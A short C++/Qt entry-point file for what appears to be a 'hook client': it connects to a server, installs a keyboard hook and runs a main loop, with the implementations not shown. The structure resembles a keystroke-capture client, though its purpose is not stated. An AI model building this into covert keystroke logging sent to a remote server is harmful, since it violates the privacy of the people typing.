#include <QDebug>

#include "hook_client.h"

int main(int, char **)
{
    qDebug() << "client";
    ConnectToServer();
    HookKeyboard();
    return MainLoop();
}
